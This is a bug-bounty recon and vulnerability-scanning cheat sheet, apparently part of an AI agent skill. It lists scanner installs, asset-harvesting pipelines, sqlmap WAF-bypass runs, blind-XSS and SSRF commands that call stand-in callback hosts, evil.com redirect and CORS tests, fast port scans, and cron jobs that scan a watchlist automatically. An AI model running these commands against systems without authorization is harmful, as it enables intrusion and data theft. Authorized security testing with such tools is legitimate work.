# TOOLS REFERENCE — Predator Recon Arsenal

**Source:** wadgamer10 methodology + SOUL.md Calculus filtering
**Principle:** Every tool must pass `Value > Cost + Risk + Irreversibility`

---

## INSTALL ALL (One-liner)

```bash
# Go tools
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/OWASP/Amass/v3/...@master
go install github.com/tomnomnom/assetfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/katana/cmd/katana@latest
go install github.com/lc/gau/v2/cmd/gau@latest
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/hahwul/dalfox/v2@latest
go install github.com/Ractiurd/jscracker@latest
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
go install github.com/tomnomnom/anew@latest
go install github.com/tomnomnom/qsreplace@latest
go install github.com/tomnomnom/hacks/kxss@latest
go install github.com/KathanP19/Gxss@latest
go install -v github.com/projectdiscovery/puredns/v2@latest
go install -v github.com/LukaSikic/subzy@latest
go install github.com/Tanmay-N/CORS-Scanner@latest

# Python tools
pip install waymore uro paramspider sqlmap arjun tplmap

# Nuclei templates
nuclei -update-templates
```

---

## TOOL QUICK REFERENCE

### SUBDOMAIN ENUMERATION

| Tool | Type | Best For | One-Liner |
|------|------|----------|-----------|
| **subfinder** | Passive | Speed + coverage | `subfinder -d target.com -all -o subs.txt` |
| **amass** | Passive/Active | Deep enum | `amass enum -passive -d target.com -o amass.txt` |
| **assetfinder** | Passive | Quick recon | `assetfinder --subs-only target.com \| anew subs.txt` |
| **puredns** | Active (bruteforce) | Hidden subdomains | `puredns bruteforce wordlist.txt target.com resolvers.txt \| anew subs.txt` |
| **subzy** | Takeover check | Dangling CNAMEs | `subzy run --targets live.txt` |

**Merging:**
```bash
cat subfinder.txt amass.txt assetfinder.txt puredns.txt | anew all-subs.txt
cat all-subs.txt | httpx -silent -mc 200,301,302,403,401 -title -tech-detect -status-code | anew live.txt
```

---

### URL & PARAMETER HARVEST

| Tool | Source | Best For | One-Liner |
|------|--------|----------|-----------|
| **waymore** | Wayback + Gau + more | Comprehensive | `waymore -i target.com -mode U -oU urls.txt` |
| **gau** | Wayback + CommonCrawl + OTX | Speed | `gau target.com \| anew urls.txt` |
| **katana** | Crawling | JS-heavy, SPA | `katana -u https://target.com -jc -kf all -o katana.txt` |
| **paramspider** | Param mining | Hidden params | `paramspider -d target.com -o params.txt` |
| **github-endpoints** | GitHub code search | Dev endpoints | `python github-endpoints.py -t token -d target.com` |

**Processing Pipeline:**
```bash
# Collect all
cat waymore.txt gau.txt katana.txt paramspider.txt | anew all-urls.txt

# Filter live
cat all-urls.txt | httpx -silent -mc 200 -o live-urls.txt

# Extract params
cat live-urls.txt | grep "=" | uro | anew params.txt

# JS files
cat all-urls.txt | grep "\.js$" | httpx -mc 200 | anew js-files.txt
```

---

### JS HUNTING

| Tool | Purpose | One-Liner |
|------|---------|-----------|
| **jscracker** | Secrets, endpoints, logic | `cat js-files.txt \| jscracker \| anew js-secrets.txt` |
| **nuclei (exposures)** | Known patterns | `nuclei -l js-files.txt -t exposures/ -t fuzzing/ -silent -o nuclei-js.txt` |
| **JSScanner** | Custom rules | `python3 JSScanner.py -f js-files.txt -o jsscanner.txt` |
| **Pinkerton** | Deep analysis | `python3 main.py -u https://target.com/file.js` |

**What to look for in JS:**
- API keys, tokens, secrets
- Internal endpoints (`/api/internal/`, `/admin/`, `/debug/`)
- GraphQL schemas, introspection
- Feature flags, config objects
- WebSocket endpoints
- PostMessage handlers (XSS vectors)

---

### VULNERABILITY SCANNING

#### XSS
```bash
# Reflected via Gxss + Dalfox
cat params.txt | Gxss -c 100 -p XssReflected | dalfox pipe -b your-xss-server.com

# Blind XSS
cat params.txt | dalfox pipe -b https://your-xss.ht -blind
```

#### SQL Injection
```bash
# Error-based
sqlmap -m params.txt --batch --random-agent --level 1 --risk 1 --tamper=space2comment --dbs

# WAF bypass
sqlmap -m params.txt --batch --random-agent --tamper=space2comment,randomcase,between,charencode --level 5 --risk 3 --dbs

# Blind/Time-based
sqlmap -u "target.com/page?id=1" --technique=T --time-sec=5 --dbs
```

#### SSRF
```bash
# Nuclei SSRF templates
nuclei -l live.txt -t ssrf/ -o ssrf.txt

# Manual via param replacement
cat params.txt | qsreplace "http://your-callback.com" | xargs -I{} curl -s {} -o /dev/null
```

#### CORS Misconfig
```bash
# CORS-Scanner
cat live.txt | CORS-Scanner

# Or manual
curl -H "Origin: https://evil.com" -I target.com/api/endpoint
```

#### Open Redirect
```bash
waybackurls target.com | grep "=http" | qsreplace "https://evil.com" | while read url; do
  curl -s -L "$url" -I | grep -i "evil.com" && echo "VULN: $url"
done
```

#### SSTI
```bash
# tplmap
./tplmap.py -u "target.com/page?param=SSTI*"

# Nuclei
nuclei -l live.txt -t ssti/ -o ssti.txt
```

---

### NETWORK RECON

| Tool | Purpose | One-Liner |
|------|---------|-----------|
| **naabu** | Fast port scan | `naabu -rate 10000 -l live-hosts.txt -silent -o ports.txt` |
| **masscan** | Internet-scale | `masscan -p1-65535 -iL live-ips.txt --rate=10000 -oB masscan.bin` |
| **nmap** | Service/version | `nmap -sV -sC -p$(cat ports.txt \| tr '\n' ',') -iL live-hosts.txt -oN nmap.txt` |

---

### NUCLEI TEMPLATES (Must-Have)

```bash
# Update
nuclei -update-templates

# Targeted scans (not spray)
nuclei -l live.txt \
  -t vulnerabilities/ \
  -t cves/ \
  -t exposures/ \
  -t misconfiguration/ \
  -t fuzzing-templates/ \
  -t ssl/ \
  -t dns/ \
  -rate-limit 100 \
  -o nuclei-results.txt

# Web3/DeFi specific
nuclei -l live.txt -t workflows/ -t blockchain/ -t crypto/
```

---

### WORDLISTS (Priority Order)

| Wordlist | Use Case | Source |
|----------|----------|--------|
| `best-dns-wordlist.txt` | Subdomain bruteforce | `https://wordlists.assetnote.io/best-dns-wordlist.txt` |
| `subdomains.txt` | Subdomain bruteforce | `https://wordlists.assetnote.io/subdomains.txt` |
| `raft-large-directories.txt` | Dir fuzzing | `https://wordlists.assetnote.io/raft-large-directories.txt` |
| `raft-large-files.txt` | File fuzzing | `https://wordlists.assetnote.io/raft-large-files.txt` |
| `burp-parameter-names.txt` | Param mining | `https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content` |
| `SecLists/Discovery/Web-Content/common.txt` | Quick dir fuzz | `https://github.com/danielmiessler/SecLists` |

---

## CALCULUS DECISION MATRIX (Per Tool)

| Tool | Value | Cost (min) | Risk | Irreversible? | When to RUN |
|------|-------|------------|------|---------------|-------------|
| subfinder | High | 1 | Low | No | **Always first** |
| amass | High | 10 | Low | No | High-value targets |
| assetfinder | Med | 0.5 | Low | No | Quick recon |
| puredns | High | 30 | Med | No | After passive exhausted |
| waymore | High | 5 | Low | No | **Always** |
| gau | High | 1 | Low | No | **Always** |
| katana | High | 10 | Low | No | SPA/JS-heavy |
| paramspider | Med | 5 | Low | No | When params needed |
| katana JS | High | 5 | Low | No | **Always** |
| jscracker | High | 2 | Low | No | **Always on JS files** |
| nuclei | High | 15 | Low | No | Targeted templates only |
| dalfox | High | 10 | Med | No | When XSS params exist |
| sqlmap | High | 30 | High | No | When SQL params confirmed |
| naabu | Med | 10 | Low | No | Internal network targets |
| subzy | Med | 2 | Low | No | After live subdomains |

**RULE:** Never run a wordlist without Calculus justification. Document in `assumptions.log`.

---

## FALSE POSITIVE HANDLING

```bash
# Every verified vuln goes through:
1. Manual verification (curl/burp)
2. Screenshot evidence
3. Impact assessment (Calculus re-check)
5. Add to vulns.txt with: target, vuln_type, impact, evidence, calculus_score

# False positives tracked:
echo "target.com | tool | reason" >> false-positives.txt
# Review weekly to tune Calculus thresholds
```

---

## AUTOMATION (Cron/Periodic)

```bash
# Daily recon on watchlist
0 6 * * * /root/.hermes/skills/predator-recon/predator-recon phase1-subdomain ~/watchlist.yaml

# Weekly deep scan
0 2 * * 0 /root/.hermes/skills/predator-recon/predator-recon auto-deep ~/recon-*/vulns.txt ~/watchlist.yaml
```

---

## RESOURCES

- **Assetnote Wordlists**: https://wordlists.assetnote.io/
- **SecLists**: https://github.com/danielmiessler/SecLists
- **Nuclei Templates**: https://github.com/projectdiscovery/nuclei-templates
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **HackTricks**: https://book.hacktricks.xyz/
- **Bug Bounty Tips**: https://github.com/EdOverflow/bugbounty-cheatsheet

---

**Remember:** The arsenal serves the loop. Tools don't find bugs. The loop finds bugs. Tools just gather intel for the loop.

*"Amateur runs all tools. Predator runs the right tool at the right time for the right reason."*